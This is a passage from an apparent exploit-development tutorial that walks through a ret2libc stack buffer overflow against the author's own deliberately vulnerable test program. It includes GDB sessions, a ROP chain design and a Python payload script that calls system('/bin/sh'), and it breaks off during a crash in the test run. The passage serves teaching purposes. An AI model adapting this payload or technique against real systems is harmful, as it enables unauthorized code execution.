&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;KnuckleSecurity :: -&amp;gt; readelf &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /usr/lib/libc.so.6  | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;system
  1023: 00000000000493d0    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let’s validate the offset by adding it to the base address and see if that address points to the system() with GDB.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;gef➤  x/i 0x00007ffff7dbe000+0x493d0
   0x7ffff7e073d0 &amp;lt;system&amp;gt;:     endbr64&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It does.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h1 id=&quot;assembling-all-the-pieces&quot;&gt;Assembling All the Pieces&lt;/h1&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now we have all the addresses we need. It is time to find the offset of the RIP by overloading the buffer. You should 
know this part already from the previous paper.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;gef➤  pattern create 500 &lt;span class=&quot;c&quot;&gt;# &amp;lt;-- Creating the pattern&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Generating a pattern of 500 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Saved as &lt;span class=&quot;s1&quot;&gt;&apos;$_gef1&apos;&lt;/span&gt;
gef➤  r aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa
Starting program: /home/burak/programming/reverse/ret2libc.elf aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa &lt;span class=&quot;c&quot;&gt;# &amp;lt;-- Sending the pattern&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Failed to find objfile or not a valid file format: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Errno 2] No such file or directory: &lt;span class=&quot;s1&quot;&gt;&apos;system-supplied DSO at 0x7ffff7fc8000&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Thread debugging using libthread_db enabled]
Using host libthread_db library &lt;span class=&quot;s2&quot;&gt;&quot;/usr/lib/libthread_db.so.1&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401187 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;vuln &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x7fffffffe833 &lt;span class=&quot;s2&quot;&gt;&quot;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at ret2libc.c:19
19      &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; Legend: Modified register | Code | Heap | Stack | String &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
&lt;span class=&quot;nv&quot;&gt;$rax&lt;/span&gt;   : 0x007fffffffe2c0  →  &lt;span class=&quot;s2&quot;&gt;&quot;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$rbx&lt;/span&gt;   : 0x007fffffffe4f8  →  0x007fffffffe806  →  &lt;span class=&quot;s2&quot;&gt;&quot;/home/burak/programming/reverse/ret2libc.elf&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$rcx&lt;/span&gt;   : 0x007fffffffe2c0  →  &lt;span class=&quot;s2&quot;&gt;&quot;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$rdx&lt;/span&gt;   : 0x007fffffffe36c  →  &lt;span class=&quot;s2&quot;&gt;&quot;aaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaa[...]&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;   : 0x007fffffffe3c8  →  0x6261616161616169 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;iaaaaaab&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$rbp&lt;/span&gt;   : 0x6261616161616168 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haaaaaab&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$rsi&lt;/span&gt;   : 0x007fffffffe953  →  &lt;span class=&quot;s2&quot;&gt;&quot;laaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabra[...]&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$rdi&lt;/span&gt;   : 0x007fffffffe3e0  →  0x626161616161616c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;laaaaaab&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$rip&lt;/span&gt;   : 0x00000000401187  →  &amp;lt;vuln+50&amp;gt; ret
&lt;span class=&quot;nv&quot;&gt;$r8&lt;/span&gt;    : 0x0
&lt;span class=&quot;nv&quot;&gt;$r9&lt;/span&gt;    : 0x007ffff7fce890  →   endbr64
&lt;span class=&quot;nv&quot;&gt;$r10&lt;/span&gt;   : 0x3
&lt;span class=&quot;nv&quot;&gt;$r11&lt;/span&gt;   : 0x007ffff7f117b0  →   endbr64
&lt;span class=&quot;nv&quot;&gt;$r12&lt;/span&gt;   : 0x0
&lt;span class=&quot;nv&quot;&gt;$r13&lt;/span&gt;   : 0x007fffffffe510  →  0x007fffffffea28  →  &lt;span class=&quot;s2&quot;&gt;&quot;ALACRITTY_LOG=/tmp/Alacritty-1014.log&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$r14&lt;/span&gt;   : 0x00000000403df0  →  0x000000004010f0  →  &amp;lt;__do_global_dtors_aux+0&amp;gt; endbr64
&lt;span class=&quot;nv&quot;&gt;$r15&lt;/span&gt;   : 0x007ffff7ffd000  →  0x007ffff7ffe2c0  →  0x0000000000000000
&lt;span class=&quot;nv&quot;&gt;$eflags&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;zero CARRY parity adjust SIGN &lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;INTERRUPT direction overflow RESUME virtualx86 identification]
&lt;span class=&quot;nv&quot;&gt;$cs&lt;/span&gt;: 0x33 &lt;span class=&quot;nv&quot;&gt;$ss&lt;/span&gt;: 0x2b &lt;span class=&quot;nv&quot;&gt;$ds&lt;/span&gt;: 0x00 &lt;span class=&quot;nv&quot;&gt;$es&lt;/span&gt;: 0x00 &lt;span class=&quot;nv&quot;&gt;$fs&lt;/span&gt;: 0x00 &lt;span class=&quot;nv&quot;&gt;$gs&lt;/span&gt;: 0x00
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffe3c8│+0x0000: 0x6261616161616169     ← &lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;
0x007fffffffe3d0│+0x0008: 0x626161616161616a
0x007fffffffe3d8│+0x0010: 0x626161616161616b
0x007fffffffe3e0│+0x0018: 0x626161616161616c     ← &lt;span class=&quot;nv&quot;&gt;$rdi&lt;/span&gt;
0x007fffffffe3e8│+0x0020: 0x00007fff6161616d
0x007fffffffe3f0│+0x0028: 0x007fffffffe4e0  →  0x007fffffffe4e8  →  0x00000000000038 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;8&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
0x007fffffffe3f8│+0x0030: 0x00000000401126  →  &amp;lt;main+0&amp;gt; push rbp
0x007fffffffe400│+0x0038: 0x00000200400040 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;@&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401180 &amp;lt;vuln+43&amp;gt;        call   0x401030 &amp;lt;memcpy@plt&amp;gt;
     0x401185 &amp;lt;vuln+48&amp;gt;        nop
     0x401186 &amp;lt;vuln+49&amp;gt;        leave
 →   0x401187 &amp;lt;vuln+50&amp;gt;        ret
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Cannot disassemble from &lt;span class=&quot;nv&quot;&gt;$PC&lt;/span&gt;
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt;:ret2libc.c+19 ────
     14  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
     15
     16  void vuln&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;char &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;input&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt;
     17    char buffer[256]&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
     18    memcpy&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;buffer, input, 300&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 →   19  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0] Id 1, Name: &quot;ret2libc.elf&quot;, stopped 0x401187 in vuln (), reason: SIGSEGV&lt;/span&gt;
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0] 0x401187 → vuln(input=0x7fffffffe833 &quot;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa&quot;)&lt;/span&gt;
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  i r rbp
rbp            0x6261616161616168  0x6261616161616168
gef➤  pattern search &lt;span class=&quot;nv&quot;&gt;$rbp&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# &amp;lt;-- Searching the pattern offset&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Searching &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;$rbp&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Found at offset 256 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;little-endian search&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; likely &lt;span class=&quot;c&quot;&gt;# &amp;lt;-- 256 bytes to the initial address of the SFP.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Starting from the buffer, if we go 256-bytes, we will hit the first memory address of where the SFP stored.
Therefore, the upcoming eight bytes are dedicated for the SFP. Further six bytes stores the RIP 
(Remember the canonical addresses for X64 and why the address is not 8 bytes).&lt;/p&gt;

&lt;p&gt;Finally, we know the offset and have all the addresses. We are good to go. I need you full attention here 
because this part will be a little confusing.&lt;/p&gt;

&lt;p&gt;Remember how the procedure prologue and epilogue take its place.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Prologue / CALL
    &lt;ol&gt;
      &lt;li&gt;Push RBP to the stack.&lt;/li&gt;
      &lt;li&gt;Move RBP to RSP.&lt;/li&gt;
      &lt;li&gt;Put the arguments to the registers.&lt;/li&gt;
      &lt;li&gt;Push the return address of the caller function to the stack.&lt;/li&gt;
      &lt;li&gt;Jump to the first instruction of the calling function.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;Epilogue / RET
    &lt;ol&gt;
      &lt;li&gt;Pop the SFP to the RBP. Restore the base pointer.&lt;/li&gt;
      &lt;li&gt;Pop the saved return address to the instruction pointer.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Those prologue and epilogue sequences are only occurs when a &lt;strong&gt;CALL&lt;/strong&gt; or &lt;strong&gt;RET&lt;/strong&gt; instruction is 
hit by the instruction pointer. So, if we manually set the instruction pointer to any address, 
we are not going to encounter with no prologue sequence. Therefore, when we writing to the stack, 
we have to remember how a function uses the stack and insert anything accordingly.&lt;/p&gt;

&lt;p&gt;So what we are trying to build is this:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;./ret2libc.elf &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print(&quot;A&quot;*256+&quot;POP RDI; RET; ADDR&quot;+&quot;/bin/bash ADDR&quot;+&quot;SYSTEM() ADDR&quot;)&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;When we supply the program with this payload, this is what is going to happen:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;vuln() function will complete its procedure epilogue and restore the base pointer. Therefore, restore the stack frame.
After restoring the stack frame, the overwritten return address will be at the top of the stack.&lt;/li&gt;
  &lt;li&gt;Finally vuln() function will execute the RET instruction after restoring the stack. 
That instruction will pop the topmost address stored in the stack to the 
instruction pointer.&lt;/li&gt;
  &lt;li&gt;After vuln() function pops the return address and points to pop rdi the address of the /bin/sh address will be the 
topmost value stored on the stack.&lt;/li&gt;
  &lt;li&gt;pop rdi instruction will pop the address of the /bin/sh to the rdi.&lt;/li&gt;
  &lt;li&gt;When pop rdi is done, the instruction pointer will execute the ret instruction. That ret instruction is again going to pop the topmost 
value stored in the stack to the instruction pointer. Therefore after the address of the /bin/sh pointer, the 
adress of the system() function should come.&lt;/li&gt;
  &lt;li&gt;system() function is going to take the value written in the rdi register as its argument and will drop us a shell.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So, with that knowledge, let’s forge a Python script.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc_base_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007ffff7dbe000&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pop_rdi_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000000000023835&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bin_sh_offset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x198031&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_function_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00000000000493d0&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;pop_rdi_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bin_sh_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin_sh_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_function_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_function_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin_sh_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_function_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let’s supply the ret2libc.elf with that payload.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;KnuckleSecurity :: -&amp;gt; gdb &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; ret2libc.elf
GEF &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;linux ready, &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;gef&lt;span class=&quot;s1&quot;&gt;&apos; to start, `gef config&apos;&lt;/span&gt; to configure
90 commands loaded and 5 functions added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GDB 12.1 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00ms using Python engine 3.10
Reading symbols from ret2libc.elf...
gef➤  r &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python ret2libc2.py&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
Starting program: /home/burak/programming/reverse/ret2libc.elf &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python ret2libc2.py&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
Debuginfod has been disabled.
To make this setting permanent, add &lt;span class=&quot;s1&quot;&gt;&apos;set debuginfod enabled off&apos;&lt;/span&gt; to .gdbinit.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Failed to find objfile or not a valid file format: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Errno 2] No such file or directory: &lt;span class=&quot;s1&quot;&gt;&apos;system-supplied DSO at 0x7ffff7fc8000&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Thread debugging using libthread_db enabled]
Using host libthread_db library &lt;span class=&quot;s2&quot;&gt;&quot;/usr/lib/libthread_db.so.1&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e070b3 &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ?? &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; from /usr/lib/libc.so.6
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; Legend: Modified register | Code | Heap | Stack | String &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
&lt;span class=&quot;nv&quot;&gt;$rax&lt;/span&gt;   : 0x007ffff7f9e260  →  0x007fffffffe5e0  →  0x007fffffffea28  →  &lt;span class=&quot;s2&quot;&gt;&quot;ALACRITTY_LOG=/tmp/Alacritty-1014.log&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$rbx&lt;/span&gt;   : 0x007fffffffe2f8  →  0x0000000000000c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;
                                                 &quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$rcx&lt;/span&gt;   : 0x007fffffffe2f8  →  0x0000000000000c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;
                                                 &quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$rdx&lt;/span&gt;   : 0x0
&lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;   : 0x007fffffffe0e8  →  0x0000000000000000
&lt;span class=&quot;nv&quot;&gt;$rbp&lt;/span&gt;   : 0x007fffffffe158  →  0x0000000000000000
&lt;span class=&quot;nv&quot;&gt;$rsi&lt;/span&gt;   : 0x007ffff7f56031  →  0x68732f6e69622f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
